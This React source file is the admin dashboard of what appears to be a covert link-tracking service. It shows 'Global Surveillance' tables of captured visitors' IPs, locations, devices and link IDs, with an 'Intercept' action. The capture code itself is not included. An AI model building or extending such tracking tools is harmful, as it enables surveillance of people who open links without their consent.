
import React, { useState, useEffect } from 'react';
import { ShieldAlert, Terminal, Eye, Globe, Database, Server, Lock, Unlock, LogOut, Search, Activity, Camera, MapPin, Cpu } from 'lucide-react';
import { CaptureReport, LinkConfig } from '../types';
import ReportDetail from './ReportDetail';

const AdminPanel: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [globalData, setGlobalData] = useState<{ reports: CaptureReport[], links: LinkConfig[], stats: any } | null>(null);
  const [loading, setLoading] = useState(false);
  const [selectedReport, setSelectedReport] = useState<CaptureReport | null>(null);
  const [search, setSearch] = useState('');

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const res = await fetch('/api/admin/global-intel', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
      if (res.ok) {
        const data = await res.json();
        setGlobalData(data);
        setIsAuthenticated(true);
      } else {
        alert("ACCESS DENIED: Credentials Invalid.");
      }
    } catch (err) {
      alert("System Error during authentication.");
    } finally {
      setLoading(false);
    }
  };

  const fetchGlobal = async () => {
    if (!isAuthenticated) return;
    try {
      const res = await fetch('/api/admin/global-intel', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
      if (res.ok) {
        const data = await res.json();
        setGlobalData(data);
      }
    } catch (err) {}
  };

  useEffect(() => {
    if (isAuthenticated) {
      const interval = setInterval(fetchGlobal, 5000);
      return () => clearInterval(interval);
    }
  }, [isAuthenticated]);

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-950 flex items-center justify-center p-6 font-sans">
        <div className="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-10 shadow-2xl relative overflow-hidden">
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500 via-orange-500 to-red-500 animate-pulse" />
          <div className="flex flex-col items-center mb-10">
            <div className="w-16 h-16 bg-red-500/10 rounded-2xl flex items-center justify-center border border-red-500/20 mb-4">
              <ShieldAlert className="text-red-500" size={32} />
            </div>
            <h1 className="text-white text-2xl font-black uppercase tracking-tighter italic">Command Center</h1>
            <p className="text-slate-500 text-[10px] uppercase font-bold tracking-[0.4em] mt-2">Classified Access Only</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-2">
              <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Codename</label>
              <input type="text" value={username} onChange={e => setUsername(e.target.value)} className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white font-bold outline-none focus:border-red-500/50 transition-colors" />
            </div>
            <div className="space-y-2">
              <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Access Key</label>
              <input type="password" value={password} onChange={e => setPassword(e.target.value)} className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white font-bold outline-none focus:border-red-500/50 transition-colors" />
            </div>
            <button disabled={loading} className="w-full bg-red-600 hover:bg-red-500 text-white font-black py-4 rounded-xl shadow-lg shadow-red-600/20 transition-all uppercase italic tracking-tighter disabled:opacity-50">
              {loading ? 'Decrypting...' : 'Authenticate'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const filteredReports = globalData?.reports.filter(r => 
    r.location?.ip?.includes(search) || r.ownerId?.includes(search) || r.linkId?.includes(search)
  ) || [];

  return (
    <div className="min-h-screen bg-slate-950 text-slate-300 font-sans p-4 md:p-10">
      <div className="max-w-7xl mx-auto space-y-10">
        {/* Header */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 bg-slate-900/50 p-8 rounded-[2rem] border border-slate-800">
          <div>
            <div className="flex items-center gap-3 mb-2">
              <Terminal className="text-red-500" size={24} />
              <h1 className="text-3xl font-black text-white uppercase italic tracking-tighter">Global Intelligence Feed</h1>
            </div>
            <p className="text-[10px] font-bold text-slate-500 uppercase tracking-[0.3em]">System Overseer Level: OMEGA</p>
          </div>
          <button onClick={() => window.location.hash = '#/'} className="flex items-center gap-2 bg-slate-800 hover:bg-slate-700 text-white px-6 py-3 rounded-xl font-bold text-sm transition-all border border-slate-700">
            <LogOut size={18} /> Exit Console
          </button>
        </div>

        {/* Global Stats */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
          {[
            { label: 'Total Captures', val: globalData?.stats.totalReports, icon: Activity, color: 'text-blue-500' },
            { label: 'Active Nodes', val: globalData?.stats.totalNodes, icon: Server, color: 'text-purple-500' },
            { label: 'Unique Targets', val: globalData?.stats.uniqueIps, icon: Globe, color: 'text-green-500' },
            { label: 'System Uptime', val: '99.9%', icon: Database, color: 'text-orange-500' }
          ].map((s, i) => (
            <div key={i} className="bg-slate-900 border border-slate-800 p-6 rounded-3xl flex flex-col items-center text-center">
              <s.icon className={`${s.color} mb-3`} size={24} />
              <span className="text-3xl font-black text-white">{s.val}</span>
              <span className="text-[10px] font-black uppercase text-slate-500 tracking-widest mt-1">{s.label}</span>
            </div>
          ))}
        </div>

        {/* Intelligence Table */}
        <div className="bg-slate-900 border border-slate-800 rounded-[2.5rem] overflow-hidden flex flex-col min-h-[600px]">
          <div className="p-8 border-b border-slate-800 flex flex-col md:flex-row md:items-center justify-between gap-4">
            <h2 className="text-xl font-black text-white uppercase italic flex items-center gap-3">
              <Eye className="text-red-500" /> Global Surveillance
            </h2>
            <div className="relative">
              <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-600" size={18} />
              <input 
                type="text" 
                placeholder="Search IPs, Owner IDs, Nodes..." 
                className="bg-slate-950 border border-slate-800 rounded-2xl pl-12 pr-6 py-3 text-sm font-bold text-white outline-none focus:border-red-500/30 w-full md:w-80"
                value={search}
                onChange={e => setSearch(e.target.value)}
              />
            </div>
          </div>

          <div className="flex-1 overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="border-b border-slate-800 text-[10px] font-black text-slate-500 uppercase tracking-widest">
                  <th className="px-8 py-4">Timestamp</th>
                  <th className="px-8 py-4">IP Address</th>
                  <th className="px-8 py-4">Owner ID</th>
                  <th className="px-8 py-4">Node / Device</th>
                  <th className="px-8 py-4">Location</th>
                  <th className="px-8 py-4">Action</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/50">
                {filteredReports.map((report, idx) => (
                  <tr key={idx} className="hover:bg-slate-800/30 transition-colors group">
                    <td className="px-8 py-6">
                      <div className="flex flex-col">
                        <span className="text-white font-bold text-sm">{new Date(report.timestamp).toLocaleDateString()}</span>
                        <span className="text-[10px] text-slate-500">{new Date(report.timestamp).toLocaleTimeString()}</span>
                      </div>
                    </td>
                    <td className="px-8 py-6">
                      <span className="font-mono text-red-400 font-bold">{report.location?.ip || '0.0.0.0'}</span>
                    </td>
                    <td className="px-8 py-6">
                      <span className="bg-slate-800 px-3 py-1 rounded-lg text-[10px] font-black text-slate-400">{report.ownerId}</span>
                    </td>
                    <td className="px-8 py-6">
                      <div className="flex flex-col">
                        <span className="text-slate-300 font-bold text-xs uppercase italic">{report.linkId}</span>
                        <span className="text-[10px] text-slate-500">{report.device?.os} / {report.device?.browser}</span>
                      </div>
                    </td>
                    <td className="px-8 py-6">
                      <div className="flex items-center gap-2 text-xs font-bold text-slate-400">
                        <MapPin size={14} className="text-red-500" />
                        {report.location?.city}, {report.location?.country}
                      </div>
                    </td>
                    <td className="px-8 py-6">
                      <button 
                        onClick={() => setSelectedReport(report)}
                        className="bg-white text-slate-950 px-4 py-2 rounded-lg font-black text-[10px] uppercase italic opacity-0 group-hover:opacity-100 transition-all hover:bg-red-500 hover:text-white"
                      >
                        Intercept
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
            {filteredReports.length === 0 && (
              <div className="py-32 flex flex-col items-center justify-center text-slate-600 italic font-bold">
                No active signal detected matching search criteria.
              </div>
            )}
          </div>
        </div>
      </div>
      {selectedReport && <ReportDetail report={selectedReport} onClose={() => setSelectedReport(null)} />}
    </div>
  );
};

export default AdminPanel;
